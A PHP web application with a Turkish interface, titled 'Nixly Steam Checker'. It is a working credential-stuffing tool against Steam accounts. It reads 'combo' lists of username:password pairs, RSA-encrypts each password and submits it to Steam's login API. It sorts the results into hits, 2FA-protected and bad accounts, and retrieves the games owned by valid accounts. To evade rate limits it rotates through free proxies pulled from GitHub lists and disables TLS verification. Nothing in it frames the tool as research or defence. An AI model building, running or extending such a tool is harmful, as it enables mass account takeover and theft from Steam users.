<?php
session_start();

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (!isset($_SESSION['user_tasks'])) {
    $_SESSION['user_tasks'] = array();
}

$GITHUB_PROXY_URLS = array(
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/themiralay/Proxy-List-World/master/data.txt',
    'https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
);

$USER_AGENTS = array(
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/137.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36',
);

define('STEAM_RSA_URL', 'https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/');
define('STEAM_AUTH_URL', 'https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/');
define('STEAM_POLL_URL', 'https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/');
define('STEAM_GAMES_URL', 'https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/');

define('PROXY_CACHE_FILE', __DIR__ . '/proxy_cache.json');
define('PROXY_CACHE_TTL', 3600);

function fetch_github_proxies() {
    global $GITHUB_PROXY_URLS;
    
    if (file_exists(PROXY_CACHE_FILE)) {
        $cache_data = json_decode(file_get_contents(PROXY_CACHE_FILE), true);
        if ($cache_data && isset($cache_data['timestamp']) && (time() - $cache_data['timestamp']) < PROXY_CACHE_TTL) {
            return $cache_data['proxies'];
        }
    }
    
    $all_proxies = array();
    
    foreach ($GITHUB_PROXY_URLS as $proxy_url) {
        $proxies = fetch_single_proxy_list($proxy_url);
        $all_proxies = array_merge($all_proxies, $proxies);
    }
    
    $all_proxies = array_unique($all_proxies);
    $all_proxies = array_values($all_proxies);
    
    $cache_data = array(
        'timestamp' => time(),
        'proxies' => $all_proxies,
    );
    @file_put_contents(PROXY_CACHE_FILE, json_encode($cache_data));
    
    return $all_proxies;
}

function fetch_single_proxy_list($url) {
    $proxies = array();
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    if ($response) {
        $lines = explode("\n", $response);
        foreach ($lines as $line) {
            $line = trim($line);
            if (empty($line) || strpos($line, '#') === 0) continue;
            
            if (preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}$/', $line)) {
                $proxies[] = $line;
            }
        }
    }
    
    return $proxies;
}

function steam_request($url, $params = null, $is_post = false, $proxy = null) {
    $ch = curl_init();
    
    if ($is_post) {
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
    } else {
        if ($params) {
            curl_setopt($ch, CURLOPT_URL, $url . '?' . http_build_query($params));
        } else {
            curl_setopt($ch, CURLOPT_URL, $url);
        }
    }
    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    }
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    curl_close($ch);
    
    if ($response === false) {
        return array('success' => false, 'eresult' => -1, 'body' => null);
    }
    
    $headers = substr($response, 0, $header_size);
    $body = substr($response, $header_size);
    
    $eresult = 0;
    if (preg_match('/x-eresult:\s*(\d+)/i', $headers, $matches)) {
        $eresult = intval($matches[1]);
    }
    
    return array('success' => true, 'eresult' => $eresult, 'body' => $body);
}

function steam_rsa_encrypt($password, $mod_hex, $exp_hex = '010001') {
    $n = hex_to_bigint($mod_hex);
    $e = hex_to_bigint($exp_hex);
    $k = intval(ceil(strlen($mod_hex) / 2));
    $d = $password;
    
    if (strlen($d) > $k - 11) return null;
    
    $ps = '';
    $ps_len = $k - strlen($d) - 3;
    
    while (strlen($ps) < $ps_len) {
        $bytes = random_bytes($ps_len - strlen($ps));
        $filtered = '';
        for ($i = 0; $i < strlen($bytes); $i++) {
            if (ord($bytes[$i]) != 0) $filtered .= $bytes[$i];
        }
        $ps .= $filtered;
    }
    
    $eb = "\x00\x02" . $ps . "\x00" . $d;
    $m = bytes_to_bigint($eb);
    $c = modpow($m, $e, $n);
    $cb = bigint_to_bytes($c, $k);
    
    return base64_encode($cb);
}

function hex_to_bigint($hex) {
    $hex = ltrim($hex, '0');
    if (empty($hex)) return '0';
    $result = '0';
    for ($i = 0; $i < strlen($hex); $i++) {
        $result = bcadd(bcmul($result, '16'), base_convert($hex[$i], 16, 10));
    }
    return $result;
}

function bytes_to_bigint($bytes) {
    $hex = bin2hex($bytes);
    return hex_to_bigint($hex);
}

function bigint_to_bytes($num, $length = null) {
    $hex = bcdechex($num);
    if (strlen($hex) % 2 != 0) $hex = '0' . $hex;
    $bytes = hex2bin($hex);
    if ($length !== null && strlen($bytes) < $length) {
        $bytes = str_repeat("\x00", $length - strlen($bytes)) . $bytes;
    }
    return $bytes;
}

function bcdechex($dec) {
    $hex = '';
    $chars = '0123456789ABCDEF';
    if ($dec == '0') return '0';
    while ($dec != '0') {
        $quot = bcdiv($dec, '16', 0);
        $rem = bcmod($dec, '16');
        $hex = $chars[intval($rem)] . $hex;
        $dec = $quot;
    }
    return $hex;
}

function modpow($base, $exp, $mod) {
    $result = '1';
    $base = bcmod($base, $mod);
    while (bccomp($exp, '0') > 0) {
        if (bcmod($exp, '2') == '1') {
            $result = bcmod(bcmul($result, $base), $mod);
        }
        $base = bcmod(bcmul($base, $base), $mod);
        $exp = bcdiv($exp, '2', 0);
    }
    return $result;
}

function check_steam_account($username, $password, $proxy = null) {
    $result = array(
        'username' => $username,
        'password' => $password,
        'status' => 'ERROR',
        'message' => '',
        'games' => array(),
    );
    
    $rsa_response = steam_request(STEAM_RSA_URL, array('account_name' => $username), false, $proxy);
    
    if (!$rsa_response['success']) {
        $result['message'] = 'RSA key alınamadı';
        return $result;
    }
    
    if ($rsa_response['eresult'] == 5) {
        $result['status'] = 'BAD';
        $result['message'] = 'Invalid username';
        return $result;
    }
    
    if (in_array($rsa_response['eresult'], array(84, 25, 87, 43))) {
        $result['status'] = 'RATE_LIMIT';
        $result['message'] = 'Rate limit';
        return $result;
    }
    
    $rsa_data = json_decode($rsa_response['body'], true);
    $rsa_info = isset($rsa_data['response']) ? $rsa_data['response'] : array();
    
    if (empty($rsa_info['publickey_mod']) || empty($rsa_info['publickey_exp'])) {
        $result['message'] = 'RSA key boş';
        return $result;
    }
    
    $encrypted_password = steam_rsa_encrypt($password, $rsa_info['publickey_mod'], $rsa_info['publickey_exp']);
    
    if (!$encrypted_password) {
        $result['message'] = 'RSA şifreleme hatası';
        return $result;
    }
    
    $auth_data = array(
        'account_name' => $username,
        'encrypted_password' => $encrypted_password,
        'encryption_timestamp' => $rsa_info['timestamp'],
        'remember_login' => 'false',
        'platform_type' => '2',
        'persistence' => '1',
        'website_id' => 'Community',
    );
    
    $auth_response = steam_request(STEAM_AUTH_URL, $auth_data, true, $proxy);
    
    if (!$auth_response['success']) {
        $result['message'] = 'Auth isteği başarısız';
        return $result;
    }
    
    if ($auth_response['eresult'] == 5) {
        $result['status'] = 'BAD';
        $result['message'] = 'Invalid password';
        return $result;
    }
    
    if (in_array($auth_response['eresult'], array(84, 25, 87, 43))) {
        $result['status'] = 'RATE_LIMIT';
        $result['message'] = 'Rate limit';
        return $result;
    }
    
    $auth_result = json_decode($auth_response['body'], true);
    $auth_info = isset($auth_result['response']) ? $auth_result['response'] : array();
    
    $allowed_confirmations = isset($auth_info['allowed_confirmations']) ? $auth_info['allowed_confirmations'] : array();
    
    $has_app_2fa = false;
    $has_email_2fa = false;
    
    foreach ($allowed_confirmations as $confirmation) {
        if (isset($confirmation['confirmation_type']) && $confirmation['confirmation_type'] == 3) {
            $has_app_2fa = true;
        }
        if (isset($confirmation['confirmation_type']) && $confirmation['confirmation_type'] == 2) {
            $has_email_2fa = true;
        }
    }
    
    if ($has_app_2fa) {
        $result['status'] = '2FA_APP';
        $result['message'] = '2FA App required';
        return $result;
    }
    
    if ($has_email_2fa) {
        $result['status'] = '2FA_EMAIL';
        $result['message'] = '2FA Email required';
        return $result;
    }
    
    $client_id = isset($auth_info['client_id']) ? $auth_info['client_id'] : '';
    $request_id = isset($auth_info['request_id']) ? $auth_info['request_id'] : '';
    $steamid = isset($auth_info['steamid']) ? $auth_info['steamid'] : '';
    
    if (empty($client_id) || empty($request_id)) {
        if (!empty($steamid)) {
            $result['status'] = 'VALID_NO_GAMES';
            $result['message'] = 'Valid';
            return $result;
        }
        $result['status'] = 'VALID_NO_GAMES';
        $result['message'] = 'Valid';
        return $result;
    }
    
    $poll_data = array(
        'client_id' => $client_id,
        'request_id' => $request_id,
    );
    
    $poll_response = steam_request(STEAM_POLL_URL, $poll_data, true, $proxy);
    
    if (!$poll_response['success']) {
        if (!empty($steamid)) {
            $result['status'] = 'VALID_NO_GAMES';
            $result['message'] = 'Valid';
            return $result;
        }
        $result['status'] = 'VALID';
        $result['message'] = 'Valid';
        return $result;
    }
    
    $poll_result = json_decode($poll_response['body'], true);
    $poll_info = isset($poll_result['response']) ? $poll_result['response'] : array();
    $access_token = isset($poll_info['access_token']) ? $poll_info['access_token'] : '';
    
    if (empty($access_token)) {
        if (!empty($steamid)) {
            $result['status'] = 'VALID_NO_GAMES';
            $result['message'] = 'Valid';
            return $result;
        }
        $result['status'] = 'VALID';
        $result['message'] = 'Valid';
        return $result;
    }
    
    if (empty($steamid)) {
        $steamid = isset($auth_info['steamid']) ? $auth_info['steamid'] : '';
    }
    
    if (!empty($steamid)) {
        $games_params = array(
            'access_token' => $access_token,
            'steamid' => $steamid,
            'include_appinfo' => '1',
            'include_played_free_games' => '1',
            'format' => 'json',
        );
        
        $games_response = steam_request(STEAM_GAMES_URL, $games_params, false, $proxy);
        
        if ($games_response['success']) {
            $games_data = json_decode($games_response['body'], true);
            $games_list = isset($games_data['response']['games']) ? $games_data['response']['games'] : array();
            foreach ($games_list as $game) {
                if (isset($game['name']) && !empty($game['name'])) {
                    $result['games'][] = $game['name'];
                }
            }
        }
    }
    
    $result['status'] = 'VALID';
    $result['message'] = 'Valid';
    
    return $result;
}

function handle_api_request() {
    header('Content-Type: application/json');
    
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    $csrf = isset($_POST['csrf']) ? $_POST['csrf'] : '';
    
    if ($csrf !== $_SESSION['csrf_token']) {
        echo json_encode(array('status' => 'error', 'message' => 'CSRF token geçersiz'));
        exit;
    }
    
    switch ($action) {
        case 'check_single':
            $username = isset($_POST['username']) ? trim($_POST['username']) : '';
            $password = isset($_POST['password']) ? $_POST['password'] : '';
            
            if (empty($username) || empty($password)) {
                echo json_encode(array('status' => 'error', 'message' => 'Kullanıcı adı ve şifre gerekli'));
                exit;
            }
            
            $result = check_steam_account($username, $password);
            echo json_encode($result);
            break;
        
        case 'get_proxies':
            $proxies = fetch_github_proxies();
            echo json_encode(array('status' => 'success', 'proxies' => $proxies, 'count' => count($proxies)));
            break;
        
        default:
            echo json_encode(array('status' => 'error', 'message' => 'Geçersiz action'));
            break;
    }
}

if (isset($_POST['action']) && isset($_POST['csrf'])) {
    handle_api_request();
    exit;
}

$proxy_count = 0;
if (file_exists(PROXY_CACHE_FILE)) {
    $cache_data = json_decode(file_get_contents(PROXY_CACHE_FILE), true);
    if ($cache_data && isset($cache_data['proxies'])) {
        $proxy_count = count($cache_data['proxies']);
    }
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nixly Steam Checker</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <link href="assets/style.css" rel="stylesheet">
</head>
<body>
    <header class="header">
        <div class="header-left">
            <div class="logo-icon">⚡</div>
            <div class="logo-text">Nixly<span>Steam</span> Checker</div>
        </div>
        <div class="header-right">
            <div class="proxy-badge">
                <span class="dot"></span>
                <span id="proxyCount"><?php echo $proxy_count; ?> proxy</span>
            </div>
            <div class="dev-badge">Developer: Nixly</div>
        </div>
    </header>
    
    <div class="main-container">
        <nav class="sidebar">
            <div class="sidebar-item active" data-tab="checker" onclick="switchTab('checker')">
                <span class="icon">🔍</span> Checker
            </div>
            <div class="sidebar-item" data-tab="single" onclick="switchTab('single')">
                <span class="icon">👤</span> Tek Hesap
            </div>
            <div class="sidebar-item" data-tab="logs" onclick="switchTab('logs')">
                <span class="icon">📋</span> Loglar
            </div>
            <div class="sidebar-item" data-tab="settings" onclick="switchTab('settings')">
                <span class="icon">⚙️</span> Ayarlar
            </div>
        </nav>
        
        <div class="content">
            <div class="tab-content active" id="tab-checker">
                <h1 class="page-title">Combo <span>Checker</span></h1>
                
                <div class="stats-grid">
                    <div class="stat-card stat-hit">
                        <div class="stat-value" id="statHit">0</div>
                        <div class="stat-label">Hit</div>
                    </div>
                    <div class="stat-card stat-2fa">
                        <div class="stat-value" id="stat2fa">0</div>
                        <div class="stat-label">2FA</div>
                    </div>
                    <div class="stat-card stat-bad">
                        <div class="stat-value" id="statBad">0</div>
                        <div class="stat-label">Bad</div>
                    </div>
                    <div class="stat-card stat-error">
                        <div class="stat-value" id="statError">0</div>
                        <div class="stat-label">Error</div>
                    </div>
                </div>
                
                <div class="card">
                    <div class="card-title"><span class="icon">📁</span> Combo Listesi</div>
                    <div class="input-group">
                        <div class="input-label">Her satıra bir hesap (kullanıcı:şifre)</div>
                        <textarea class="input-field" id="comboInput" placeholder="kullanici1:sifre1&#10;kullanici2:sifre2&#10;kullanici3:sifre3"></textarea>
                    </div>
                    <div style="display: flex; gap: 10px; align-items: center;">
                        <button class="btn btn-primary" id="btnStart" onclick="startCheck()">
                            🚀 Başlat
                        </button>
                        <button class="btn btn-danger" id="btnStop" onclick="stopCheck()" style="display: none;">
                            ⏹️ Durdur
                        </button>
                        <div class="spinner" id="spinner"></div>
                    </div>
                </div>
                
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" id="progressFill"></div>
                    </div>
                    <div class="progress-text" id="progressText">Hazır</div>
                </div>
                
                <div class="results-container">
                    <div class="card">
                        <div class="card-title"><span class="icon">✅</span> Hit Hesaplar</div>
                        <div class="result-box hit-box" id="hitResults">
                            <div class="result-empty">Henüz hit yok...</div>
                        </div>
                    </div>
                    <div class="card">
                        <div class="card-title"><span class="icon">🔐</span> 2FA Hesaplar</div>
                        <div class="result-box twofa-box" id="twofaResults">
                            <div class="result-empty">Henüz 2FA yok...</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="tab-content" id="tab-single">
                <h1 class="page-title">Tek Hesap <span>Kontrol</span></h1>
                
                <div class="card">
                    <div class="card-title"><span class="icon">👤</span> Hesap Bilgileri</div>
                    <div class="input-group">
                        <div class="input-label">Kullanıcı Adı</div>
                        <input type="text" class="input-field" id="singleUser" placeholder="steam_kullanici">
                    </div>
                    <div class="input-group">
                        <div class="input-label">Şifre</div>
                        <input type="password" class="input-field" id="singlePass" placeholder="••••••••">
                    </div>
                    <button class="btn btn-primary" onclick="checkSingle()">
                        🔍 Kontrol Et
                    </button>
                </div>
                
                <div class="card" id="singleResult" style="display: none;">
                    <div class="card-title"><span class="icon">📊</span> Sonuç</div>
                    <div id="singleResultContent"></div>
                </div>
            </div>
            
            <div class="tab-content" id="tab-logs">
                <h1 class="page-title">Log <span>Kayıtları</span></h1>
                <div class="card">
                    <div class="card-title"><span class="icon">📋</span> Canlı Log</div>
                    <div class="log-container" id="logContainer">
                        <div class="log-entry">Sistem hazır...</div>
                    </div>
                </div>
            </div>
            
            <div class="tab-content" id="tab-settings">
                <h1 class="page-title">Ayarlar <span>Panel</span></h1>
                
                <div class="card">
                    <div class="card-title"><span class="icon">🌐</span> Proxy Ayarları</div>
                    <div class="input-group">
                        <div class="input-label">Proxy Durumu</div>
                        <div style="display: flex; gap: 10px; align-items: center;">
                            <span id="proxyStatus"><?php echo $proxy_count > 0 ? '✅ Aktif' : '⚠️ Proxy yok'; ?></span>
                            <button class="btn btn-secondary" onclick="refreshProxies()">🔄 Proxyleri Yenile</button>
                        </div>
                    </div>
                    <div class="input-label" style="margin-top: 10px;">Proxy'ler GitHub'dan otomatik alınır. Proxyless mod da desteklenir.</div>
                </div>
                
                <div class="card">
                    <div class="card-title"><span class="icon">ℹ️</span> Hakkında</div>
                    <div style="font-size: 13px; color: var(--muted); line-height: 1.8;">
                        <strong style="color: var(--accent);">Nixly Steam Checker</strong><br>
                        Steam hesap checker web uygulaması<br>
                        Developer: <strong style="color: var(--text);">Nixly</strong><br>
                        Versiyon: 1.0.0<br>
                        Proxyless: ✅ Desteklenir<br>
                        GitHub Proxy: ✅ Otomatik
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        const CSRF_TOKEN = '<?php echo $_SESSION['csrf_token']; ?>';
        const PROXY_COUNT = <?php echo $proxy_count; ?>;
    </script>
    <script src="assets/script.js"></script>
</body>
</html>